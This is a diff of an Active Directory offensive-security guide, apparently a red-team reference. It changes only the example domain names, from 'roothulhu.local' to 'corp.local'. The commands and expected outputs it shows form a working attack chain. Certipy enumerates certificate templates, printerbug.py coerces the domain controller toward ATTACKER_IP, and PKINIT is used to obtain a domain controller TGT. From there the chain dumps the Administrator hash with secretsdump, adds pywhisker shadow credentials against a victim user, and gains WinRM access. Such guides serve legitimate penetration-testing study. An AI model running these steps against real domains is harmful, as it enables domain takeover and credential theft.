-# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/11/2022 19:55:02, Flags: FPRIA
 #     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 # Ticket cache: FILE:/tmp/krb5cc_647402606
-# Default principal: svc_workstations@<DOMAIN>
+# Default principal: svc_workstations@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
-# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/11/2022 19:55:02, Flags: FPRIA
 #     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 # I: [check] KCM Kerberos tickets
@@ -5714,7 +5714,7 @@ Attackers can enumerate the certificate template which is used by Domain Control
 **Enumerate the certificate template**
 
 ```bash
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabled -hide-admins
+certipy find -u '<USER>@<corp.local>' -p '<PASSWORD>' -dc-ip '<IP>' -text -enabled -hide-admins
 ```
 
 **Run impacket-ntlmrelayx** 
@@ -5730,7 +5730,7 @@ Attackers can either wait for victims to attempt authentication against their ma
 **Run printerbug.py**
 
 ```bash
-python3 printerbug.py <DOMAIN>/wwhite:"<USER>"@<DC01_IP> <ATTACKER_IP>
+python3 printerbug.py CORP.LOCAL/<USER>:"<USER>"@<DC01_IP> <ATTACKER_IP>
 ```
 
 **Expected output**
@@ -5804,7 +5804,7 @@ pip3 install -r requirements.txt
 **Run PKINIT**
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <DC01_IP> '<DOMAIN>/dc01$' /tmp/dc.ccache
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <DC01_IP> '<corp.local>/dc01$' /tmp/dc.ccache
 ```
 
 **Expected Output**
@@ -5826,7 +5826,7 @@ Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) 
 
 ```bash
 export KRB5CCNAME=/tmp/dc.ccache
-impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@DC01.<DOMAIN>
+impacket-secretsdump -k -no-pass -dc-ip <DC01_IP> -just-dc-user Administrator '<CORP.RTH>/DC01$'@DC01.<CORP.RTH>
 ```
 
 **Expected Output**
@@ -5849,14 +5849,14 @@ We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform thi
 **Generate a X.509 certificate and write the public key to the victim user's msDS-KeyCredentialLink attribute**
 
 ```bash
-pywhisker --dc-ip <DC01_IP> -d <DOMAIN>.LOCAL -u wwhite -p '<PASSWORD>' --target <USER> --action add
+pywhisker --dc-ip <DC01_IP> -d CORP.LOCAL -u wwhite -p '<PASSWORD>' --target <USER> --action add
 ```
 
 **Expected Output**
 
 ```bash
 # [*] Searching for the target account
-# [*] Target user found: CN=<FULL NAME>,CN=Users,DC=roothulhu,DC=local
+# [*] Target user found: CN=<FULL NAME>,CN=Users,DC=corp,DC=local
 # [*] Generating certificate
 # [*] Certificate generated
 # [*] Generating KeyCredential
@@ -5876,7 +5876,7 @@ In the output above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.p
 **Use this file with gettgtpkinit.py to acquire a TGT as the victim**
 
 ```bash
-python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip <DC01_IP> ROOTHULHU.LOCAL/<USER> /tmp/<USER>.ccache
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
 ```
 
 **Expected Output**
@@ -5905,16 +5905,16 @@ klist
 
 ```bash
 # Ticket cache: FILE:/tmp/jpinkman.ccache
-# Default principal: jpinkman@ROOTHULHU.LOCAL
+# Default principal: jpinkman@CORP.LOCAL
 
 # Valid starting       Expires              Service principal
-# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/ROOTHULHU.LOCAL@ROOTHULHU.LOCAL
+# 04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/CORP.LOCAL@CORP.LOCAL
 ```
 
 In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):
 
 ```bash
-evil-winrm -i dc01.roothulhu.local -r roothulhu.local
+evil-winrm -i dc01.corp.local -r corp.local
 ```
 
 **Expected Output:**
@@ -5928,7 +5928,7 @@ evil-winrm -i dc01.roothulhu.local -r roothulhu.local
 
 # Info: Establishing connection to remote endpoint
 # *Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
-# roothulhu\jpinkman
+# corp\jpinkman
 ```
 
 </details>
